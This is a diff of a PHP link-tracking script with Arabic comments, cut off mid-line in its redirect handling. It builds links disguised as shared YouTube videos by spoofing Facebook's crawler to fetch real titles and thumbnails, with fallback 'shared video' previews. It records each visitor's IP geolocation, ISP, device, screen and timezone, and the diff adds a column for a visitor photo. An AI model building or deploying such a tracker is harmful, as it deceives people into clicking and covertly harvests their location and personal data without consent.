@@ -2,14 +2,13 @@
 // ضبط المنطقة الزمنية للجزائر بدقة
 date_default_timezone_set('Africa/Algiers');
 
-// إظهار الأخطاء للتحقق والتأكد من العمل
+// إظهار الأخطاء للتشخيص إن وجدت
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -33,44 +32,39 @@ try {
         device_info TEXT, 
         screen_res TEXT, 
         timezone TEXT, 
+        photo TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 } catch (Exception $e) {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// دالة سريعة جداً لسحب غلاف وعنوان الفيديو الحقيقي بدون إبطاء
-function fetch_meta_details($url) {$title = "";
-    $image = "";
+// دالة سحب العنوان وغلاف الفيديو الحقيقي بسرعة
+function fetch_meta_details($url) {$title = "فيديو مشارك";
+    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
-    // استخراج صورة يوتيوب المصغرة فوراً بأسلوب مباشر وفائق السرعة
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
         $video_id =$matches[1];
         $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
     }
 
-    // قراءة عنوان الصفحة مع إيقاف مؤقت سريع جداً (1 ثانية فقط)
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL,$url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
-    $html = curl_exec($ch);
-    curl_close($ch);
+    $options = [
+        'http' => [
+            'method' => "GET",
+            'header' => "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\r\n",
+            'timeout' => 2
+        ]
+    ];
+    $context = stream_context_create($options);$html = @file_get_contents($url, false,$context);
 
     if ($html) {
         if (preg_match('/<property="og:title"\s+content="([^"]+)"/i', $html,$m) || preg_match('/<title>(.*?)<\/title>/i', $html,$m)) {
             $title = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
         }
-        if (empty($image) && preg_match('/<property="og:image"\s+content="([^"]+)"/i', $html,$m)) {
+        if (!isset($video_id) && preg_match('/<property="og:image"\s+content="([^"]+)"/i', $html,$m)) {
             $image =$m[1];
         }
     }
-
-    if (empty($title)) {$parsed = parse_url($url);$title = $parsed['host'] ?? $url;
-    }
-
     return ['title' => $title, 'image' =>$image];
 }
 
@@ -117,26 +111,18 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه الفوري والذكي
-$og_title = "";
-$og_image = "";
+$og_title = "محتوى مرئي";
+$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
     $stmt->execute([$code]);
-    $link =$stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($link) {
-        $target =$link['target_url'];
-        $og_title =$link['meta_title'];
-        $og_image =$link['meta_image'];
-
-        // إذا كان الطلب قادماً من محركات المشاركة (Facebook
+    $link =$stmt->fetch(PDO::
